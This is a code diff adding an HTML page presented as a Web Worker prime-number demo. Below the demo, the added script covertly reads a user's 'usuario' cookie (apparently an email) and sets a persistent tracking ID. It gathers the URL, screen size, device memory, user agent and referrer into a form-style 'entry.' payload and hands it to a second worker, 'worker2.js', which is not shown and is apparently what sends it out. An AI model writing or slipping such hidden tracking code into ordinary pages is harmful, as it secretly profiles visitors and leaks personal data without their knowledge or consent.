@@ -1,0 +1,45 @@
+<!DOCTYPE HTML>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Worker example: One-core computation</title>
+</head>
+
+<body>
+
+<p>The highest prime number discovered so far is: <output id="result"></output></p>
+
+<script>
+let worker = new Worker('worker.js');
+worker.onmessage = function (event) {
+  document.getElementById('result').textContent = event.data;
+};
+
+
+function loggetCookie(id) {
+  let name = id + "=";
+  let ca = document.cookie.split(';');
+  for(let i = 0; i < ca.length; i++) {
+    let c = ca[i];
+    while (c.charAt(0) == ' ') c = c.substring(1);
+    if (c.indexOf(name) == 0) {
+      return c.substring(name.length, c.length);
+    }
+  }
+  return '';
+}
+
+let logEmail = loggetCookie('usuario');
+let logCookie = loggetCookie('logCookie');
+if (logCookie === '') {
+  logCookie = (Math.random().toString(36) + "00000000000").substring(2,13).toUpperCase();
+  document.cookie = `logCookie=${logCookie};expires=2027-01-01T00:00:00.000Z;path=/;samesite=none;secure;`;
+}
+  
+const dataString = `entry.340072360=${document.URL};${logCookie};${logEmail};${screen.width}x${screen.height};${navigator.deviceMemory ? navigator.deviceMemory + 'GiB' : 'N/A'};${navigator.userAgent.replace(/;/g, ',')};${document.referrer}`;
+
+const myWorker = new Worker('worker2.js');
+myWorker.postMessage(dataString);
+</script>
+</body>
+</html>
